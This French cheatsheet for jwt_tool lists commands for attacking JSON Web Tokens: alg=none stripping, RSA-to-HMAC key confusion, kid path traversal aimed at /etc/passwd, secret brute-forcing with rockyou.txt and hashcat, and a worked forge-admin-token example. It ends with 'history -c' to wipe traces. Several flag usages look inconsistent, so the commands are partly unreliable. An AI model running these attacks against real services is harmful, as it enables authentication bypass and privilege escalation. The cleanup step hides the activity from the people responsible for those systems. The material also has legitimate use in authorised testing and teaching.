🔐 JWT Tool – Cheatsheet Cybersécurité

Cette cheatsheet regroupe les commandes essentielles pour analyser, manipuler, modifier, forcer et exploiter des tokens JWT.

🧩 1. Analyse basique d’un token

jwt_tool token.jwt

Analyse générale du token (en-têtes, claims, signature)

jwt_tool token.jwt -d

Décodage complet : header + payload + signature

jwt_tool token.jwt -t

Test automatique des vulnérabilités courantes

🔍 2. Information détaillée sur les claims

jwt_tool token.jwt -p

Affiche uniquement le payload (claims / données)

jwt_tool token.jwt -h

Affiche uniquement le header du JWT

🛠 3. Manipulation / Modification du token

jwt_tool token.jwt -S none

Remplacement de l’algorithme par none (test vulnérabilité None Signing)

jwt_tool token.jwt -I -pc admin:true

Injection / modification d’un claim dans le payload

jwt_tool token.jwt -I -hc alg:HS256

Modification du header (ex : changer l’algorithme)

jwt_tool token.jwt -I -hc kid:"../../../../etc/passwd"

Test d’injection dans le paramètre kid

🔐 4. Génération d'un JWT modifié

jwt_tool token.jwt -C -pk secretkey

Recalcule un token avec une clé secrète connue

jwt_tool token.jwt -X -p payload.json -H header.json

Reconstruit entièrement un JWT à partir de fichiers JSON

jwt_tool token.jwt -I -pc role:admin -pk secret

Modifie un claim et resign avec une clé donnée

🧨 5. Attaques courantes
🔓 5.1. Algorithme None

jwt_tool token.jwt -S none

Supprime la signature pour tester l'acceptation par le serveur

🔄 5.2. Confusion RSA → HMAC (HS256)

jwt_tool token.jwt -T hs256 -pk public.pem

Utilise une clé publique RSA en tant que clé HMAC (HS256)

🪤 5.3. Injection via kid

jwt_tool token.jwt -I -hc kid:"../../../dev/null"

Injection de path traversal dans l’en-tête kid

💥 5.4. Bruteforce clé secrète

jwt_tool token.jwt -C --wordlist rockyou.txt

Bruteforce de la clé HMAC (HS256)

🔁 6. Fuzzing & Tests automatiques

jwt_tool token.jwt -t

Tests automatiques : alg=none, kid, HMAC confusion, etc.

jwt_tool token.jwt -T all

Test de tous les algorithmes supportés

jwt_tool token.jwt -A

Analyse complète des vulnérabilités

🧪 7. Exemple d’exploitation pratique

jwt_tool token.jwt -p

Lire les claims → voir “role:user”

jwt_tool token.jwt -I -pc role:admin -pk secret

Modifier le rôle en admin et resign avec secret

jwt_tool new.jwt

Vérifier que le token est conforme

Envoyer le token modifié dans le cookie / header Authorization

Exploitation finale

🔧 8. Outils complémentaires

python3 -m jwt token --key secret

Vérifier la signature (PyJWT)

hashcat -a 0 -m 16500 token.jwt rockyou.txt

Bruteforce de clé HMAC via Hashcat (format JWT)

🧹 9. Nettoyage

rm newtoken.jwt

Suppression des tokens générés

history -c

Nettoyage de l’historique CLI

📚 10. Ressources utiles

PortSwigger JWT Attacks

Référence complète des attaques JWT

OWASP JSON Web Token Security

Bonnes pratiques & vulnérabilités

PayloadsAllTheThings – JWT

Payloads utiles pour fuzzing JWT
